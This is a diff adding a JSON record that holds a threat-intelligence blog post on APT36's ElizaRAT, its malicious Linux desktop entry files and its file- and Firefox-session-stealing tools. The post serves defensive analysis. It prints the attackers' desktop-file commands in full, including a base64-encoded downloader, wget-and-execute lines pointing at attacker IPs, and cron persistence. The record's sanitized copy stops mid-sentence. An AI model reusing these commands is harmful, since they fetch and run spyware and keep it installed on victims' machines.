@@ -1,0 +1,2085 @@
+{
+  "original_txt": "Zscaler Blog\nGet the latest Zscaler blog updates in your inbox\nA peek into APT36’s updated arsenal\nIntroduction\nIn July 2023, Zscaler ThreatLabz discovered new malicious activity perpetuated by the Pakistan-based advanced persistent threat group (APT36). APT36 is a sophisticated cyber threat group with a history of conducting targeted espionage operations in South Asia. We observed APT36 targeting Indian government sectors using a previously undocumented Windows RAT, new cyber espionage utilities for Linux, new distribution mechanisms, and a new attack vector used against the Linux environment.\nIn this blog, we will examine the latest tools employed by APT36, which are designed to target both Windows and Linux operating systems.\nKey Takeaways\n- Updated arsenal of APT36: The threat actor has resurfaced with a fresh, fully functional Windows remote administration tool (RAT), novel tools for cyber espionage on Linux systems, innovative distribution methods, and additional attack vectors.\n- New Windows RAT: A custom RAT, referred to as ElizaRAT, has been incorporated into the APT36 toolkit. ElizaRAT is delivered as a .NET binary and establishes a C2 communication channel via Telegram, enabling threat actors to exert complete control over the targeted endpoint.\n- Abuse of legitimate services: Legitimate services, such as Google Drive and Telegram, are abused in different stages of the attack chain.\n- New attack vectors for Linux: APT36 now boasts innovative weaponization of Linux desktop configuration files that target Linux-based endpoints in the Indian government sector.\n- Deceptive tactics: The threat actor took extensive measures to conceal any link to Pakistan. They chose the infrastructure and artifacts meticulously to make it appear as though the activities were conducted in India.\n- Reuse of infrastructure: In some cases, the same C2 infrastructure is being used by APT36 for both credential phishing attacks and distributing malicious binaries.\nBrief Overview\nAPT36 is an advanced persistent threat (APT) group which we attribute to Pakistan with very high confidence. This group has been active since 2013 and primarily targets the Indian government, defense, and education sectors.\nThis group leverages credential harvesting and malware distribution attacks to conduct cyber espionage. APT36 utilizes:\n- Custom-built remote administration tools targeting Windows\n- Lightweight Python-compiled cyber espionage tools serving specific purpose targeting Windows and Linux\n- Weaponized open-source C2 frameworks like Mythic\n- Trojanized installers of Indian government applications like KAVACH multi-factor authentication\n- Trojanized Android apps\n- Credential phishing sites targeting Indian government officials\nAnalysis of ElizaRAT, the New Windows RAT\nWe assigned the moniker “ElizaRAT” to this new Windows-based backdoor utilized by APT36 due to the distinctive strings identified within the commands observed during our real-time analysis of the C2 communication channel.\nElizaRAT is distributed as .NET binaries sent inside password-protected archive files hosted on Google Drive links. During our threat analysis, we gathered several samples of ElizaRAT and they all shared these characteristics:\n- They are all .NET binaries that are compiled as Control Panel applets (CPL) and use the \".cpl\" file extension. To the best of our knowledge, we believe this is the first time APT36 has weaponized the CPL file format.\n- The binaries are large in size - ranging from 4MB to 16MB.\n- The Costura .NET framework was used to embed the essential .NET assemblies inside the main malware which resulted in the inflation of binary sizes.\n- The Telegram API was used for C2 communication.\nFor this technical analysis, we use the following file metadata:\n- MD5 hash: fc99daa2e1b47bae4be51e5e59aef1f0\n- Filename: AgendaMeeting.cpl\nSince this Windows RAT arrives on the endpoint in the form of a Control Panel applet, the first method called upon execution is CplApplet().\nThis method transfers control to Program().Main() which in turn invokes an asynchronous task - MainAsync(). Inside this task, all important malicious operations are carried out.\nThe image below shows Program().Main() kick starting the malicious activities on the endpoint.\nFigure 1: The MainAsync() method used to start the malicious activities on the endpoint.\nSome of the key operations performed by ElizaRAT are:\n- Initializes the Telegram bot with Communicate.ConnectMe() using the built-in Telegram bot token and sets it up in polling mode to receive commands from the threat actor.\n- Creates a directory: %appdata%\\TextSource\n- Generates a UUID and username specific to the infected machine.\n- Drops and displays a decoy PDF file to the user.\n- Sets up persistence on the machine.\n- Fetches details on antivirus softwares running on the machine and sends the information to the attacker-controlled Telegram bot.\nIn the following sections, we dive deeper into some of these operations.\nLogging Operation\nEach execution result is logged on both the endpoint (client-side) and the Telegram bot (server-side).\nThe code below shows that logging is done at the local and remote level.\n| // remote logging in Telegram bo await Communication.send_message(\"Username Created with name : \" + TextSource.Settings._username); // local logging on the infected endpoint File.AppendAllText(TextSource.Settings.log_p, \"username created local\\n\"); |\nUnique Identifier Generation\nA UUID and username are generated for each infected machine so that the threat actor can uniquely identify the victim. It uses Windows Management Instrumentation (WMI) to fetch the processorID and UUID of the machine, and uses both these details to generate a UUID and username specific to the infected machine\nThe only difference between the generated UUID and the username is the \".cookie\" extension. The username is the UUID without the \".cookie\" extension.\nThe image below shows the relevant code used to generate these values.\nFigure 2: The getusername() method used to generate the UUID and username to identify the infected machine.\nC2 Command Format\nSince the threat actor uses the same Telegram bot to manage multiple infected endpoints, they use a specific C2 command format to synchronize the operations and ensure that a given command executes only on the intended endpoint.\nThe C2 command format looks like this:\nC2 Commands\nAll C2 commands are handled in a switch-case statement by the Bot_OnMessage() method inside the Communicate class. Before the execution of any command, the RAT extracts the username from the C2 command and compares it with the infected machine's username. The command is executed successfully only if both the values match.\nThe following C2 commands are supported by the bot:\n| C2 COMMAND | FUNCTIONALITY |\n|---|---|\n| /dir | Fetches the list of files in the specified directory. |\n| /upload | Uploads the specified file from the victim’s machine. |\n| /getprocess | Gets the list of processes running on the victim’s machine. The list is returned in a file with the name getproc.dll . |\n| /run | Executes the specified program on the victim’s machine. |\n| /delete | Deletes the specified file. |\n| /end | Kills the specified processes on the victim’s machine. |\n| /online | Checks whether the infected machine is online. |\n| /identity | Connects to the specified website from the victim’s machine and sends a response to the threat actor. This can be used to fetch the machine’s IP address by supplying a parameter like hxxps://api.ipify[.]org . |\n| /ping | Checks internet connectivity from the victim’s machine to the specified website. |\n| /scr | Takes a screenshot of the victim’s machine and sends it to the threat actor in a file named scr.dll . |\n| /createdir | Creates a directory on the user’s machine. |\nPersistence\nIn order to achieve persistence on the infected machine, the bot creates a Windows shortcut file (LNK) in the Windows Startup directory.\nThe image below shows the code used to create this shortcut file. The name of the shortcut file is fetched from the \"orig_name\" setting defined in the config. In this case, the shortcut file is called TextSource.lnk.\nFigure 3: The buildforts() method used to create a Windows shortcut file in the Startup directory for persistence.\nThe description of this shortcut file is set to \"Text Editing APP for Windows\" to disguise it as a text editing application, making it seem innocuous. In addition, the target command line is set to execute the Control panel applet using rundll32 .\nDisplaying Decoy Content\nThe method dosome() defined in the Program class is responsible for displaying the decoy PDF file to the user. This decoy file is present inside the resources section of the .NET binary.\nThe image below shows the decoy file. It is only used to distract the victim and make it appear that an error occurred when opening the file.\nFigure 4: Decoy PDF file displayed to the user.\nMalicious Linux Desktop Entry Files as New Attack Vectors\nThe utilization of Linux desktop entry files by APT36 as an attack vector has never been documented before. This attack vector is fairly new and appears to be utilized in very low-volume attacks. So far, our research team has discovered three samples - all of which have 0 detection on VirusTotal.\nWe first observed an occurrence in May 2023 when a credential phishing website used to target Indian government employees was also found to be hosting a redirector to distribute ZIP archives containing malicious Linux desktop entry files.\nNational Informatics Center (NIC), India Phishing Attack - May 2023\nIn May 2023, we discovered a credential phishing site, email9ov[.]in, targeting Indian government officials by masquerading as the official login portal for National Informatics Center (NIC), India. We notified NIC in May 2023 about this website and the associated threat intel.\nWe also noticed that the same phishing website was using the hxxps://email9ov[.]in/VISIT_OF_MEDICAL URL to redirect visitors to the hxxp://103.2.232[.]82:8081/Tri-Service-Exercise/Delegation_Saudi_Arabia.zip URL.\nFrom here, a visitor would download a ZIP archive containing a maliciously crafted Linux desktop entry file.\nHere are some technical details about this case:\n- ZIP archive MD5 hash: 9c66f8c0c970822985600bed04e56434\n- ZIP filename: Delegation_Saudi_Arabia.zip\n- Desktop entry file MD5 hash: f27a4968af4ed64baef8e086516e86ac\n- Desktop entry filename: Delegation_Saudi_Arabia.desktop\nDesktop entry file analysis\nWe found the following content in the desktop entry file:\n| [Desktop Entry] Encoding=UTF-8 Name=Delegation_Saudi_Arabia.pdf Exec=sh -c \"echo 'L3Vzci9iaW4vd2dldCAnaHR0cDovLzEwMy4yLjIzMi44Mjo4MDgxL1R yaS1TZXJ2aWNlLUV4ZXJjaXNlL0RlbGVnYXRpb25fU2F1ZGlfQXJhYmlhLnBkZicgLU8g L3RtcC9EZWxlZ2F0aW9uX1NhdWRpX0FyYWJpYS5wZGY7IC91c3IvYmluL3dnZXQgJ2 h0dHA6Ly8xMDMuMi4yMzIuODI6ODA4MS9JU0VQQy0xMi0yMDIzLUFnZW5kYS1mb3It bWVldGluZy8xODUnIC1PIC90bXAvMTg1LmVsZjsgY2QgL3RtcDsgY2htb2QgK3ggMTg1 LmVsZjtsaWJyZW9mZmljZSAvdG1wL0RlbGVnYXRpb25fU2F1ZGlfQXJhYmlhLn BkZiB8IC4vMTg1LmVsZg==' | base64 -d | sh\" Terminal=false Type=Application Icon=x-office-document |\nThe icon of this desktop entry file is set to \"x-office-document\" to seem like an innocent Office document.\nThe base64-encoded command present inside the desktop entry file decodes to:\n| /usr/bin/wget 'hxxp://103.2.232[.]82:8081/Tri-Service-Exercise/Delegation_Saudi_Arabia.pdf' -O /tmp/Delegation_Saudi_Arabia.pdf; /usr/bin/wget 'hxxp://103.2.232[.]82:8081/ISEPC-12-2023-Agenda-for-meeting/185' -O /tmp/185.elf; cd /tmp; chmod +x 185.elf;libreoffice /tmp/Delegation_Saudi_Arabia.pdf | ./185 |\nThe command decoded above performs the following actions:\n1. Downloads the decoy PDF and saves it in the /tmp directory with the filename: Delegation_Saudi_Arabia.pdf .\n2. Downloads the Linux payload and saves it in the /tmp directory with the filename: 185.elf .\n3. Marks the Linux binary as executable.\n4. Uses LibreOffice to open and display the decoy PDF file.\n5. Executes the Linux payload.\nIn this case, the Linux payload was a cross-platform binary designed to run on both Linux and WSL (Windows Subsystem for Linux) machines. Since it did not contain a fully functional C2 mechanism at the time of analysis, we believe it was still in a development phase and used by the threat actor as an initial test.\nTo read about “Lee” agent’s cross-platform capabilities, visit the Lumen blog.\nThe content inside the decoy PDF file is displayed in the image below.\nFigure 5: Decoy PDF displayed to the user.\nThe PDF appears to be a document from the Indian Ministry of Defence describing the visit of nine members of a delegation from Saudi Arabia, where they discussed issues with Indian Armed Forces medical officials.\nInflated File Attack - June 2023\nBeginning in June 2023, we detected APT36 establishing their operational infrastructure on a server with the IP address 153.92.220.59. The threat actor proceeded to register multiple domains hosted on this IP. Further insight into this attacker-controlled infrastructure is available in the Threat Actor Infrastructure section.\nIn August, we noted a significant development where few of these domains served as the hosting platform for decoy PDF files. These PDFs were linked within the malicious Linux desktop entry files, which the threat actor distributed enclosed in zip archives.\nHere are some technical details about this case:\n- ZIP archive MD5 hash: 36b19ca8737c63b9c9a3365ff4968ef5\n- ZIP filename: Meeting_agenda.zip\n- Desktop entry file MD5 hash: 65167974b397493fce320005916a13e9\n- Desktop entry filename: approved_copy.desktop\nDesktop entry file analysis\nThe first anomaly we observed was the large size of the Linux desktop entry file. A size larger than 1 MB for a Linux desktop entry file is rare. Reviewing the file revealed that the threat actor inflated the size of the file by adding more than a million \"#\" characters. We believe this was an attempt by the threat actor to bypass security scanning solutions.\nThe image below shows the extra characters added to the inflated Linux desktop entry file.\nFigure 6: The inflated Linux desktop entry file.\nThe relevant content from the Linux desktop entry file is shown below.\n| [Desktop Entry] Type=Application Name=approved_copy.pdf Exec=bash -c \"xdg-open 'https://admin-dept[.]in//approved_copy.pdf' && mkdir -p ~/.local/share && wget 64.227.133[.]222/zswap-xbusd -O ~/.local/share/zswap-xbusd && chmod +x ~/.local/share/zswap-xbusd; echo '@reboot ~/.local/share/zswap-xbusd'>>/dev/shm/myc.txt; crontab -u `whoami` /dev/shm/myc.txt; rm /dev/shm/myc.txt; ~/.local/share/zswap-xbusd\" Icon=application-pdf Name[en_US]=approved_copy.desktop |\nThis desktop file performs these main operations:\n- Downloads the decoy PDF file from the https://admin-dept[.]in/approved_copy.pdf URL and displays it to the victim. This decoy file contains an error message to distract the user. Figure 7 shows that the icon of this desktop file is set to application-pdf which is done to disguise the malware as an innocuous file.\n- Creates a hidden directory path called, local/share, in the user's home directory.\n- Downloads the Linux payload from the URL 64.227.133[.]222/zswap-xbusd using wget. Saves it as zswap-xbusd in the previously created hidden directory.\n- Writes a short shell script to the file /dev/shm/myc.txt. The shell script reboots the machine and then launches the Linux payload.\n- Sets up a cron job under the current username to run the contents of the /dev/shm/myc.txt script.\n- Deletes the shell script.\n- Executes the Linux payload.\nFigure 7: The icon of the desktop configuration file is set to PDF to make it more convincing.\nAt the time of our analysis, the server 64.227.133[.]222 was not serving the Linux payload. We continued monitoring this infrastructure and noticed that on Aug 29, 2023, a new domain called admin-br[.]in was registered and used to distribute a new Linux desktop entry file. In this instance, we were able to retrieve the payloads and conclude the threat attribution to APT36.\nHere is metadata from the new Linux desktop entry file:\n- MD5 hash: 574013c4a22ca2d8d8c76e65ef5e8059\n- Filename: approved_copy.desktop\nThe relevant content from the Linux desktop entry file is shown below.\n| [Desktop Entry] Type=Application Name=approved_copy.pdf Exec=bash -c \"xdg-open 'https://admin-br[.]in//approved_copy.pdf' && mkdir -p ~/.local/share && wget 64.227.138[.]127/4200f0916f146d2ac5448e91a3afe1b3/pickle-help -O ~/.local/share/pickle-help && chmod +x ~/.local/share/pickle-help;~/.local/share/pickle-help >/dev/null 2>&1 & sleep 5; wget 134.209.159[.]9/4200f0916f146d2ac5448e91a3afe1b3/ziputils-help -O ~/.local/share/ziputils-help && chmod +x ~/.local/share/ziputils-help; echo '@reboot ~/.local/share/ziputils-help'>>/dev/shm/myc.txt;echo '@reboot ~/.local/share/ziputils-help'>>/dev/shm/myc.txt; crontab -u `whoami` /dev/shm/myc.txt; rm /dev/shm/myc.txt;~/.local/share/ziputils-help &\" Icon=application-pdf Name[en_US]=approved_copy.desktop |\nThe functionality of this file is similar to the previous Linux desktop entry file.\nThe image below shows a decoy PDF file displaying an error message stating “Failed to load the PDF document”. This is used to distract the user while malicious activities occur in the background.\nFigure 8: The decoy PDF file displayed to the user.\nIn this case, the Linux desktop entry file retrieves the malicious Linux payloads from the servers at:\n- 64.227.138[.]127\n- 134.209.159[.]9\nThe two files retrieved are cleverly named to disguise themselves as legitimate software utilities.\nHere is the metadata of Linux payloads:\n- MD5 hash: 98279047a7db080129e5ec84533822ef\n- Filename: pickle-help\n- MD5 hash: 248d4e6bb0f32afd7a1cfb975910235a\n- Filename: ziputils-help\nA quick technical analysis determined these Linux payloads as Mythic Poseidon binaries. Since Mythic is an open-source framework that is well-documented on GitHub, we will not explore its technical details in this blog.\nThe corresponding C2 servers extracted from each malicious Linux payload are listed below.\n| C2 IP ADDRESS | PORT |\n|---|---|\n| 108.61.163[.]195 | 7443 |\n| 64.176.40[.]100 | 7443 |\nThe C2 panel for Mythic Poseidon can be accessed by visiting the URI path /new/login on the server running at port 7443.\nFor instance, the C2 panel for 108.61.163[.]195 can be accessed at hxxps://108.61.163[.]195:7443/new/login .\nFigure 9: The Mythic C2 panel for the Poseidon binary.\nNew Python-Based Cyber Espionage Utilities Targeting Linux\nDuring our analysis, we also discovered new Python-based ELF binaries used by APT36 for the purpose of cyber espionage. These binaries target the Linux environment in the Indian government organizations and are named to seem like legitimate Linux system services.\nIn this section, we review two types of cyber espionage tools discovered by our research team.\nGLOBSHELL - Custom-built File exfiltration Linux utility\nThe espionage tool under analysis includes this metadata:\n- MD5 hash: 3c3c9303ae33f3bae2e139dbb1db838e\n- Filename: rcu-tasks-kthread\nThis ELF binary was compiled using PyInstaller. We extracted the decompiled Python code to understand its functionality. The image below shows the decompiled code.\nFigure 10: The decompiled code of Python-based cyber espionage tool type 1.\nThese are the key operations performed by this script:\n- The script contains a predefined list of file extensions which are scanned for in the /media directory recursively. The list of file extensions includes various types like image files, MS Office files, LibreOffice, and PDF.\n- Once the list of files is built, it copies the files to a hidden directory in the path: ~/.config/bossconfig/usnconfig/\n- The content inside this directory is archived into a ZIP file called usnconfig.zip .\n- Data is exfiltrated to the URL hxxp://baseuploads[.]com/myf/test.php in an HTTP POST request. Along with the ZIP file, the machine's username, hostname, and the current timestamp are sent.\nWe found another ELF binary called mm-precpu-wq with the same functionality as the ELF binary discussed above. However, this binary included a more in-depth predefined list of file extensions and file paths which it scans to exfiltrate files. In addition to the /media directory, this binary also searches the following paths:\n- /home/{user}/Downloads/**/\n- /home/{user}/Documents/**/\n- /home/{user}/Desktop/**/\n- /home/{user}/Pictures/**/\n- /home/{user}/.local/share/Trash/**/\nPYSHELLFOX - Custom-built Firefox session stealing Linux utility\nThe second type of cyber espionage tool we discovered steals the Firefox browser session details of the user if the user has a browser tab open with any of the following titles or URLs:\n- email.gov.in/#\n- inbox\n- web.whatsapp.com\nAs is evident from this list, the threat actor is interested in exfiltrating the user's Indian government inbox details as well as WhatsApp conversations.\nThe image below shows the relevant code section which does this.\nFigure 11: The decompiled code Python-based cyber espionage tool type 2.\nThe espionage tool under analysis includes this metadata:\n- MD5 hash: c86f9ef23b6bb200fc3c0d9d45f0eb4d\n- Filename: events-highpri\nThese are the key operations performed by this script:\n- Fetches the list of all the live Firefox sessions by scanning the path .mozilla/firefox/*default*/sessionstore-backups/recovery.js* .\n- For each file on the list, the code locates the file containing the magic bytes, mozLz40\\x00, as the first 8 bytes.\n- Uses LZ4 decompression to extract the JSON data from the magic bytes file. This JSON data has details about the windows and tabs in the current live Firefox session.\n- Iterates over every tab in every Firefox window, extracting the title and the URL from each tab. Then, the code checks if they match any value in the predefined list mentioned earlier.\n- If and when it finds a match, the code archives the ~/.mozilla/firefox directory content into the /dev/shm/firefox.zip ZIP archive.\n- Uploads the ZIP archive to hxxp://baseuploads[.]com/myf/test.php in an HTTP POST request. In addition to uploading the data, the code also uploads the username, hostname, and current timestamp.\nReasons for New Linux-Based Attack Vectors\nWhy is APT36 suddenly adding new attack vectors for the Linux environment?\n- Historic and widespread usage of Linux in the Indian government sector: Linux-based operating systems are widely used in the Indian government sector. The Debian-based operating system, BOSS (Bharat Online Software Solution), developed by CDAC is used across various state ministries and even the Indian defense forces. For more details about the usage of Linux Boss in India, visit the Ministry of Electronics & Information Technology.\n- Expanding into government-related verticals: The recent announcement by the Indian government introduces Maya OS, a Debian Linux-based operating system that will replace Microsoft Windows OS across government and defense sectors. Consequently, there is now a substantial incentive for APT36 and other nation-state threat actors, known for targeting India, to incorporate new attack vectors and Linux payloads into their arsenal. The ubiquitous use of Linux-based systems in more verticals means more potential victims.\nThreat Attribution\nWe attribute these new Windows and Linux-based attacks to APT36 because their method of serving decoy PDF files, the metadata and their Linux commands are almost identical to previous attacks, which are known and linked to APT36. In addition to this, there is also a C2 infrastructure overlap with previous APT36 attacks which we describe in more detail in the corresponding section.\nDecoy PDF files\nThe decoy PDF file which is dropped in the same directory as the malicious DLL on the victim's machine by ElizaRAT. The metadata of this PDF file indicated the author as \"Apolo Jones\" and the PDF file itself was generated with Microsoft Office Word.\nBoth these indicators align with our technical analysis of APT36 from November of 2022.\nIn addition to this, the decoy PDF files downloaded from the attacker-controlled servers in the campaign targeting the Linux platform share the same metadata as well.\nLinux commands\nWhile the attack vector used to distribute the Linux payload is entirely new in this campaign, the Linux commands and file paths used in the desktop entry files share similarities with the previous APT36 campaign used to distribute Linux payloads.\nIn March 2023, APT36 used a Python-compiled ELF binary to target the Linux environment in the Indian government sector. You can read about it on the Uptycs blog.\nBy comparing the Linux commands used in the decompiled Python code in March 2023 and the Linux commands used in the latest desktop entry files (in August 2023), we can see a clear similarity.\nThe figure below shows a side-by-side comparison of the two.\nFigure 12: A side-by-side comparison of Linux commands from the March 2023 and August 2023 campaigns executed by APT36.\nHere is a list of similarities between both cases:\n- A hidden directory path structure is created in the location: ~/.local/share .\n- A short shell script responsible for rebooting the machine and executing the Linux payload is written to /dev/shm/ .\n- The same crontab command is executed.\n- The shell script is deleted.\n- The sequence of commands is similar.\nThreat Actor Infrastructure\nIn the APT36 attacks observed since April 2023, the threat actor has taken extensive measures to conceal any connection to Pakistan by making it seem that the infrastructure is controlled by a threat actor in India. We assess, with a high-confidence, that this is not a coincidence but rather an intentional deception tactic used by APT36 to avoid the attacks from being attributed to Pakistan.\nRegistrant Country of C2 Domains\nBeginning in June 2023, the threat actor started registering several domains on a server with the IP address 153.92.220.59. The IP address is related to the Hostinger ASN. This infrastructure was involved in the attacks distributing malicious Linux desktop entry files discussed earlier.\nWhile the WHOIS information for all these domains is redacted, we can still see the registrant country. For most of the domains, the threat actor took sufficient measures to ensure the registrant country is India (IN). However, for one of the domains, admindesk[.]in, we can see the registrant country is PK (Pakistan).\nThe figure below shows examples of WHOIS information for two of the domains registered by the threat actor on the same infrastructure and used in the same attack.\nFigure 13: A side-by-side comparison of the WHOIS info from two attacker-registered domains related to same campaign and infrastructure.\nWe believe this was an OPSEC mistake by the threat actor.\nC2 Infrastructure Overlap\nThere is a C2 infrastructure overlap between the latest campaign and the previous instances of attacks by APT36.\n- In 2022, the server with IP address 153.92.220[.]48 was used to host the domains below which are registered by APT36:\n- Govscholarships[.]in\n- Kavach-apps[.]com\n- Kavach-app[.]in\n- Rodra[.]in\n- ksboard[.]in\n- In the latest instance, a server with IP address: 153.92.220[.]59 was used to host the C2 domains. Both the IP addresses belong to the same subnet: 153.92.220.0/24\n- These IP addresses belong to the ASN - AS 47583 (Hostinger) which has been abused by APT36 in the past.\nEmail Associated with Malicious Google Drive Links\nElizaRAT is distributed using malicious Google Drive links. Leveraging the Google Drive ID from the links, we gathered additional information about the owner of the Google Drive and the corresponding email address. The image below shows the information we retrieved.\nFigure 14: A Google Drive link details revealing owner information.\nThe email address and owner name associated with the Google Drive link was:\n- Email address: [email protected]\n- Owner namer: \"Nand Kishore\"\nBecause “Nand Kishore” is a common name in India, the fake owner was added to implicate a threat actor from India, not Pakistan - where APT36 originates.\nAttacker-Controlled Server IP Addresses\nIn a few instances, threat actors distributed malicious Linux desktop entry files where the embedded payloads were hosted on servers located in India. This tactic of using servers in the same region as the targeted country for mounting attacks is another deceptive technique employed by APT36.\nHere is a list of the IP addresses of four servers hosting the malicious Linux payloads:\n- 103.2.232[.]82\n- 64.227.133[.]222\n- 64.227.138[.]127\n- 134.209.159[.]9\nTop Level Domain (TLDs) of Malicious Domains\nIn all of the attacks we reviewed for this blog, the TLD was always set to .in - corresponding with the country of India. Another tactic used by APT36 in a few cases is to disguise bad URLs as official Indian government-related web addresses.\nConclusion\nOur research team is actively monitoring the C2 infrastructure of APT36, which is used to register new domains that are used in attacks targeting the Linux environment. The infrastructure continues to be active at the time of this blog publication. We have included a comprehensive list of indicators of compromise (IOCs) at the end of this blog and we urge the research community to update their detection. We have also done a proactive responsible disclosure to the National Informatics Centre (NIC), India with IOC details and the associated threat intelligence.\nAPT36’s introduction of new file formats, new attack vectors, and a new backdoor to the arsenal suggests that they are actively updating their tactics, techniques, and procedures (TTPs). In addition to staying on top of these threats, Zscaler's ThreatLabz team continuously monitors for new threats and shares its findings with the wider community.\nZscaler Coverage\nZscaler's multilayered cloud security platform detects indicators at various levels.\n- Win32.RAT.ElizaRAT\n- Win64.RAT.ElizaRAT\n- Linux.Payload.GLOBSHELL\n- Linux.Payload.PYSHELLFOX\n- Linux.Backdoor.Mythic\nThe image below shows the sandbox detection for the new Windows RAT (ElizaRAT) used in the attack.\nMITRE ATT&CK TTP Mapping\n| ID | TACTIC | TECHNIQUE |\n|---|---|---|\n| T1218.002 | System Binary Proxy Execution: Control Panel | ElizaRAT is distributed in the form of Control Panel applet file format (cpl). |\n| T1567.002 | Exfiltration Over Web Service | ElizaRAT uses the Telegram API for C2 communication. |\n| T1564.001 | Hide Artifacts: Hidden Files and Directories | Linux desktop entry file downloads and drops binaries in hidden directories. |\n| T1036 | Masquerading: Match Legitimate Name or Location | Linux desktop entry file downloads and drops binaries in hidden directories. |\n| T1027.001 | Obfuscated Files or Information: Binary Padding | More than a million “#” characters are added to the Linux desktop entry file to inflate its file size and potentially bypass security scanning solutions. |\nIndicators of Compromise (IOCs)\nWindows Platform\n| MD5 HASH | BINARY NAME |\n|---|---|\n| b14884744cf3f86f6bd5a87f6bcbed85 | NotepadPlus.cpl |\n| a37d9aa1e165b9dc6c4ff396a9df49aa | NotepadPlus.cpl |\n| 62ee540334236723136bf0fecfeb6311 | NotepadPlus.cpl |\n| b89990ec5fe9b5cef59f1cd690403a75 | NotepadPlus.cpl |\n| 9cc4c6ca7826c0771cfbdf27b2bbb515 | NotepadPlus.cpl |\n| fc99daa2e1b47bae4be51e5e59aef1f0 | AgendaMeeting.cpl |\n| 66a69bf967bb882e34b1c32081a9ccee | TextSource.cpl |\n| a279035702edd9f2507b5ce5fa69c6d4 | Agenda_Meeting.cpl |\n| 1741147a31526e23798a7a1b702ade36 | Agenda_Meeting.rar |\nLinux Platform\n| MD5 HASH | BINARY NAME |\n|---|---|\n| 65167974b397493fce320005916a13e9 | approved_copy.desktop |\n| 574013c4a22ca2d8d8c76e65ef5e8059 | approved_copy.desktop |\n| 36b19ca8737c63b9c9a3365ff4968ef5 | Meeting_Agenda.zip |\n| 9c66f8c0c970822985600bed04e56434 | Delegation_Saudi_Arabia.zip |\n| f27a4968af4ed64baef8e086516e86ac | Delegation_Saudi_Arabia.desktop |\n| 98279047a7db080129e5ec84533822ef | pickle-help |\n| 248d4e6bb0f32afd7a1cfb975910235a | ziputils-help |\n| MD5 HASH | BINARY NAME |\n|---|---|\n| 3c3c9303ae33f3bae2e139dbb1db838e | rcu-tasks-kthread |\n| 7608c396f0dfb9eac8d88a7b5a7e04e4 | mm-precpu-wq |\n| c86f9ef23b6bb200fc3c0d9d45f0eb4d | events-highpri |\n| 6a2243837c71d8071523cc76b8d4af43 | nm_applet |\n| 8e4f65d5d58fca38a6d66a1afb228f20 | xdg-user_dirs |\nAttacker Infrastructure\nThe domains and URLs below are involved in the attacks used to target Linux environments with desktop entry files. Notice how all of them are using “.in” as the TLD.\n- admincell[.]in\n- admin-dept[.]in\n- coordbranch[.]in\n- adminbr[.]in\n- coordbr[.]in\n- admin-desk[.]in\n- admindesk[.]in\n- adminsec[.]in\n- admindept[.]in\n- admin-br[.]in\n- hxxps://email9ov[.]in/VISIT_OF_MEDICAL/\n- hxxp://103.2.232[.]82:8081/ISEPC-12-2023-Agenda-for-meeting/\nThe domains and URLs below are related to the Python-based cyber espionage tools.\n- baseuploads[.]com\n- baseuploads[.]com/myf/test.php\n- indiauc[.]com\n- indiauc[.]com/myf/test.php\nThe URLs used to host the password-protected archive files distributing ElizaRAT:\n- hxxps://drive.google.com/uc?export=download&id=1SaBv9C5EJlXKCQQ_8Tlkl1cBJ9-9XN8u\n- hxxps://drive.google.com/uc?export=download&id=140KPyaNuYZgOhP3Q7sTQPZ6a-q6x5j-h\nWas this post useful?\nDisclaimer: This blog post has been created by Zscaler for informational purposes only and is provided \"as is\" without any guarantees of accuracy, completeness or reliability. Zscaler assumes no responsibility for any errors or omissions or for any actions taken based on the information provided. Any third-party websites or resources linked in this blog post are provided for convenience only, and Zscaler is not responsible for their content or practices. All content is subject to change without notice. By accessing this blog, you agree to these terms and acknowledge your sole responsibility to verify and use the information as appropriate for your needs.\nGet the latest Zscaler blog updates in your inbox\nBy submitting the form, you are agreeing to our privacy policy.",
+  "sanitized_txt": "Zscaler Blog Get the latest Zscaler blog updates in your inbox A peek into APT36’s updated arsenal Introduction In July 2023, Zscaler ThreatLabz discovered new malicious activity perpetuated by the Pakistan-based advanced persistent threat group (APT36). APT36 is a sophisticated cyber threat group with a history of conducting targeted espionage operations in South Asia. We observed APT36 targeting Indian government sectors using a previously undocumented Windows RAT, new cyber espionage utilities for Linux, new distribution mechanisms, and a new attack vector used against the Linux environment.\nIn this blog, we will examine the latest tools employed by APT36, which are designed to target both Windows and Linux operating systems.\nKey Takeaways - Updated arsenal of APT36: The threat actor has resurfaced with a fresh, fully functional Windows remote administration tool (RAT), novel tools for cyber espionage on Linux systems, innovative distribution methods, and additional attack vectors.\n- New Windows RAT: A custom RAT, referred to as ElizaRAT, has been incorporated into the APT36 toolkit. ElizaRAT is delivered as a .NET binary and establishes a C2 communication channel via Telegram, enabling threat actors to exert complete control over the targeted endpoint.\n- Abuse of legitimate services: Legitimate services, such as Google Drive and Telegram, are abused in different stages of the attack chain.\n- New attack vectors for Linux: APT36 now boasts innovative weaponization of Linux desktop configuration files that target Linux-based endpoints in the Indian government sector.\n- Deceptive tactics: The threat actor took extensive measures to conceal any link to Pakistan. They chose the infrastructure and artifacts meticulously to make it appear as though the activities were conducted in India.\n- Reuse of infrastructure: In some cases, the same C2 infrastructure is being used by APT36 for both credential phishing attacks and distributing malicious binaries.\nBrief Overview APT36 is an advanced persistent threat (APT) group which we attribute to Pakistan with very high confidence. This group has been active since 2013 and primarily targets the Indian government, defense, and education sectors.\nThis group leverages credential harvesting and malware distribution attacks to conduct cyber espionage. APT36 utilizes:\n- Custom-built remote administration tools targeting Windows - Lightweight Python-compiled cyber espionage tools serving specific purpose targeting Windows and Linux - Weaponized open-source C2 frameworks like Mythic - Trojanized installers of Indian government applications like KAVACH multi-factor authentication - Trojanized Android apps - Credential phishing sites targeting Indian government officials Analysis of ElizaRAT, the New Windows RAT We assigned the moniker “ElizaRAT” to this new Windows-based backdoor utilized by APT36 due to the distinctive strings identified within the commands observed during our real-time analysis of the C2 communication channel.\nElizaRAT is distributed as .NET binaries sent inside password-protected archive files hosted on Google Drive links. During our threat analysis, we gathered several samples of ElizaRAT and they all shared these characteristics:\n- They are all .NET binaries that are compiled as Control Panel applets (CPL) and use the \".cpl\" file extension. To the best of our knowledge, we believe this is the first time APT36 has weaponized the CPL file format.\n- The binaries are large in size - ranging from 4MB to 16MB.\n- The Costura .NET framework was used to embed the essential .NET assemblies inside the main malware which resulted in the inflation of binary sizes.\n- The Telegram API was used for C2 communication.\nFor this technical analysis, we use the following file metadata:\n- MD5 hash: fc99daa2e1b47bae4be51e5e59aef1f0 - Filename: AgendaMeeting.cpl Since this Windows RAT arrives on the endpoint in the form of a Control Panel applet, the first method called upon execution is CplApplet().\nThis method transfers control to Program().Main() which in turn invokes an asynchronous task - MainAsync(). Inside this task, all important malicious operations are carried out.\nThe image below shows Program().Main() 